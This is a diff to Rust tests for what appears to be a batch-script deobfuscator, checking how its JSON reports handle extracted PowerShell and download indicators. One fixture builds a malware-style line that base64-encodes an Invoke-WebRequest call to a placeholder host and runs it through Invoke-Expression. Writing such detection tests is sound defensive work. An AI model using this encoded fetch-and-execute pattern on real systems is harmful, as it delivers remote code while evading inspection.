@@ -570,8 +570,69 @@ fn report_include_source_and_deob_inlines_both() {
     let s = String::from_utf8_lossy(&out.stdout);
     assert!(s.contains("\"source\""), "source missing");
     assert!(s.contains("\"deobfuscated\""), "deobfuscated missing");
+    assert!(
+        !s.contains("\"deobfuscated_preview\""),
+        "preview duplicates deobfuscated output: {s}"
+    );
     // Source verbatim (json-escaped).
     assert!(s.contains("marker_XYZ"), "marker missing from source/deob");
+}
+
+#[test]
+fn report_include_deob_exposes_extracted_powershell_without_polluting_deob() {
+    use base64::Engine;
+
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    let payload = "InVoKe-WebReQuEsT -UrI https://report-extracted.example/p";
+    let encoded = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
+    fs::write(
+        &input,
+        format!(
+            "@echo off\r\npowershell -Command \"$x='{encoded}'; $y=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($x)); Invoke-Expression $y\"\r\n"
+        ),
+    )
+    .expect("write");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["report", "--include-deob", input.to_str().expect("path")])
+        .output()
+        .expect("run");
+    assert!(
+        out.status.success(),
+        "stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+
+    let s = String::from_utf8_lossy(&out.stdout);
+    let v: serde_json::Value = serde_json::from_str(&s).expect("valid json");
+    let deob = v["deobfuscated"].as_str().expect("deobfuscated");
+    assert!(
+        !deob.contains("==== batdeob: extracted") && !deob.contains("report-extracted.example"),
+        "extracted PowerShell polluted parent deob: {deob}"
+    );
+    let normalized = v["extracted_payloads"]["powershell_normalized"]
+        .as_array()
+        .expect("powershell_normalized payload array");
+    assert!(
+        normalized.iter().any(|payload| payload
+            .as_str()
+            .unwrap_or("")
+            .contains("report-extracted.example")),
+        "normalized extracted PowerShell missing from separated payload buffers: {v}"
+    );
+    assert!(
+        v["downloads"]
+            .as_array()
+            .expect("downloads")
+            .iter()
+            .any(|download| download["src"]
+                .as_str()
+                .unwrap_or("")
+                .contains("report-extracted.example")),
+        "download trait from extracted PowerShell was not reported: {v}"
+    );
 }
 
 #[test]
@@ -618,6 +679,10 @@ fn summarize_emits_compact_report() {
     );
     let s = String::from_utf8_lossy(&out.stdout);
     let v: serde_json::Value = serde_json::from_str(&s).expect("valid json");
+    assert!(
+        v.get("deobfuscated_preview").is_none(),
+        "summarize should not emit redundant deobfuscated preview: {v}"
+    );
     assert!(!v["downloads"].as_array().expect("downloads").is_empty());
     assert!(v["admin_commands"]["reg"].as_u64().expect("reg count") >= 1);
 }
